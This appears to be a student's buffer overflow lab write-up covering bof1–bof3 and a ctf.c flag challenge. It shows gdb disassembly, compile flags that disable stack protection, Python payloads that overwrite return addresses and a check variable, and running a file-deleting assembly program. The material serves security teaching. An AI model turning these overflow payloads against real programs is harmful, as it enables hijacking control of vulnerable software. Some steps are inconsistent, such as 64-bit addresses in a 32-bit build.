**Lab#1: Conduct buffer overflow attack on _bof1.c_, _bof2.c_, _bof3.c_ programs.**
## bo1.c
 - Step 1: Compile the program
        ```gcc -m32 -fno-stack-protector -z execstack -o bof1 bof1.c```
 - Step 2: Find the Address of `secretFunc()`
    ```ruby
    gdb ./bof1
    (gdb) disassemble secretFunc
    Dump of assembler code for function secretFunc:
    0x00000000000011a5 <+0>:     push   %rbp
    0x00000000000011a6 <+1>:     mov    %rsp,%rbp
    0x00000000000011a9 <+4>:     lea    0xe50(%rip),%rax        # 0x2000
    0x00000000000011b0 <+11>:    mov    %rax,%rdi
    0x00000000000011b3 <+14>:    mov    $0x0,%eax
    0x00000000000011b8 <+19>:    call   0x1020 <printf@plt>
    0x00000000000011bd <+24>:    nop
    0x00000000000011be <+25>:    pop    %rbp
    0x00000000000011bf <+26>:    ret
    End of assembler dump.
    (gdb) print &secretFunc
    $1 = (void (*)()) 0x11a5 <secretFunc>
    ```
     - The address is  `0x00000000000011a5`.
 - Step 3: Craft the input\
   ```python -c 'import sys; sys.stdout.buffer.write(b"A" * 200 + b"\xa5\x11\x00\x00\x00\x00\x00\x00")' > exploit_input```
 - Step 4: Run the program\
   ```./bof1 < exploit_input```
   - The output should show this line:\
   ```Congratulations!```
## bof2.c
- Step 1: Compile the program\
Ensure the program is compiled without stack protection and with debugging information.\
```gcc -o buffer_overflow buffer_overflow.c -fno-stack-protector -z execstack -g```
- Step 2: Run the program
```./bof2```
- Step 3: Check the buffer size
- Step 4: Create a exploit input
You need to construct an input that:
    - Fills buf with 40 characters.
    - Overwrites check with the value 0xdeadbeef.
- Step 5: Generate the input
```python -c 'print("A" * 40 + "\xef\xbe\xad\xde")' > exploit_input```\
This command creates a file named exploit_input containing:
    - 40 'A's (filling buf)
    - The bytes ef be ad de (overwriting check)
- Step 6: run the program with exploit input
```./bof2 < exploit_input```
- Step 7: Check the output
If successful, you get this: 
```ruby
Yeah! You win!
```
## bof3.c
- Step 1: Compile the program
  ```gcc -o bof3 bof3.c -fno-stack-protector -z execstack -g```
- Step 2: Open ```gdb``` \
  ```gdb ./bof3```
- Step 3: Find the address of ```shell```
  ```ruby
    (gdb) disassemble shell
    Dump of assembler code for function shell:
       0x0000000000001195 <+0>:     push   %rbp
       0x0000000000001196 <+1>:     mov    %rsp,%rbp
       0x0000000000001199 <+4>:     lea    0xe60(%rip),%rax        # 0x2000
       0x00000000000011a0 <+11>:    mov    %rax,%rdi
       0x00000000000011a3 <+14>:    call   0x1030 <puts@plt>
       0x00000000000011a8 <+19>:    nop
       0x00000000000011a9 <+20>:    pop    %rbp
       0x00000000000011aa <+21>:    ret
    End of assembler dump.  
  ```
  ```ruby
  (gdb) print &shell
  $1 = (void (*)()) 0x1195 <shell>
  ```
- Step 4: Create a exploit input
  ```ruby
  python -c 'import sys; sys.stdout.buffer.write(b"A" * 128 + b"\x95\x11\x00\x00")'
  ```
- Step 5: Run the program with exploit input
- Step 6: Check the output
  ```ruby
  You made it! The shell() function is executed
  ```
  is visible on the output if it is correct.
 
#
**Lab#2:**
#
## Inject code to delete file: file_del.asm is given on github
- Step 1: Compile and run the code
  - Assemble the code\
    ```nasm -f elf32 file_del.asm -o file_del.o```
  - Link the object file\
    ```ld -m elf_i386 file_del.o -o file_del```
  - Run the program\
    ```./file_del```
`
  ```ruby
  Dockerfile                 bof3.c                     flag.c
  a.out                      docker                     flag.out
  bof1                       docker-compose.debug.yml   flow.c
  bof1.c                     docker-compose.yml         flow.out
  bof1.out                   exploit_input              input.txt
  bof2                       file_del                   pattern.c
  bof2.c                     file_del.asm               pattern.out
  bof3                       file_del.o                 peda-session-flag.out.txt
  ```
    The ```dummyfile``` is deleted, means that we're correct.
## Conduct attack on ctf.c
- Step 1: Compile the program\
  ```gcc -g -fno-stack-protector -o ctf ctf.c```
- Step 2: Find the address of ```myfunc()```\
  ```ruby
  gdb ./ctf
  (gdb) disassemble myfunc
  Dump of assembler code for function myfunc:
       0x00000000000011d5 <+0>:     push   %rbp
       0x00000000000011d6 <+1>:     mov    %rsp,%rbp
       0x00000000000011d9 <+4>:     sub    $0x60,%rsp
       0x00000000000011dd <+8>:     mov    %edi,-0x54(%rbp)
       0x00000000000011e0 <+11>:    mov    %esi,-0x58(%rbp)
       0x00000000000011e3 <+14>:    lea    0xe16(%rip),%rax        # 0x2000
       0x00000000000011ea <+21>:    mov    %rax,%rsi
       0x00000000000011ed <+24>:    lea    0xe0e(%rip),%rax        # 0x2002
       0x00000000000011f4 <+31>:    mov    %rax,%rdi
       0x00000000000011f7 <+34>:    call   0x1060 <fopen@plt>
       0x00000000000011fc <+39>:    mov    %rax,-0x8(%rbp)
       0x0000000000001200 <+43>:    cmpq   $0x0,-0x8(%rbp)
       0x0000000000001205 <+48>:    jne    0x1220 <myfunc+75>
       0x0000000000001207 <+50>:    lea    0xdfe(%rip),%rax        # 0x200c
       0x000000000000120e <+57>:    mov    %rax,%rdi
       0x0000000000001211 <+60>:    call   0x1050 <puts@plt>
       0x0000000000001216 <+65>:    mov    $0x0,%edi
       0x000000000000121b <+70>:    call   0x1070 <exit@plt>
       0x0000000000001220 <+75>:    mov    -0x8(%rbp),%rdx
       0x0000000000001224 <+79>:    lea    -0x50(%rbp),%rax
       0x0000000000001228 <+83>:    mov    $0x40,%esi
       0x000000000000122d <+88>:    mov    %rax,%rdi
       0x0000000000001230 <+91>:    call   0x1040 <fgets@plt>
    --Type <RET> for more, q to quit, c to continue without paging--c
       0x0000000000001235 <+96>:    lea    0xde2(%rip),%rax        # 0x201e
       0x000000000000123c <+103>:   mov    %rax,%rdi
       0x000000000000123f <+106>:   mov    $0x0,%eax
       0x0000000000001244 <+111>:   call   0x1030 <printf@plt>
       0x0000000000001249 <+116>:   cmpl   $0x4081211,-0x54(%rbp)
       0x0000000000001250 <+123>:   je     0x1268 <myfunc+147>
       0x0000000000001252 <+125>:   lea    0xdd7(%rip),%rax        # 0x2030
       0x0000000000001259 <+132>:   mov    %rax,%rdi
       0x000000000000125c <+135>:   mov    $0x0,%eax
       0x0000000000001261 <+140>:   call   0x1030 <printf@plt>
       0x0000000000001266 <+145>:   jmp    0x1296 <myfunc+193>
       0x0000000000001268 <+147>:   cmpl   $0x44644262,-0x58(%rbp)
       0x000000000000126f <+154>:   je     0x1287 <myfunc+178>
       0x0000000000001271 <+156>:   lea    0xdb8(%rip),%rax        # 0x2030
       0x0000000000001278 <+163>:   mov    %rax,%rdi
       0x000000000000127b <+166>:   mov    $0x0,%eax
       0x0000000000001280 <+171>:   call   0x1030 <printf@plt>
       0x0000000000001285 <+176>:   jmp    0x1296 <myfunc+193>
       0x0000000000001287 <+178>:   lea    0xdc1(%rip),%rax        # 0x204f
       0x000000000000128e <+185>:   mov    %rax,%rdi
       0x0000000000001291 <+188>:   call   0x1050 <puts@plt>
       0x0000000000001296 <+193>:   leave
       0x0000000000001297 <+194>:   ret
  End of assembler dump.
  (gdb) print &myfunc
  $1 = (void (*)(int, int)) 0x11d5 <myfunc>
    ```
  - Step 3: Create the exploit
    ```ruby
    p = 0x04081211  # address p
    q = 0x44644262  # address q
    myfunc_addr = 0x11d5 
    
    payload = b"A" * 100  # Fill the buffer
    payload += myfunc_addr.to_bytes(4, 'little')  # Overwrite return address
    payload += p.to_bytes(4, 'little')  # Parameter p
    payload += q.to_bytes(4, 'little')  # Parameter q
    
    with open("exploit_input", "wb") as f:
        f.write(payload)
    ```
    Run it with ```python exploit_code.py``` #replace with your actual file
  - Step 4: Run the program with exploit
    ```./ctf < exploit_input```
  - Step 5: Check the output\
    The output should be printed:
    ```ruby
    myfunc is reached, You got the flag
    ```
    

    
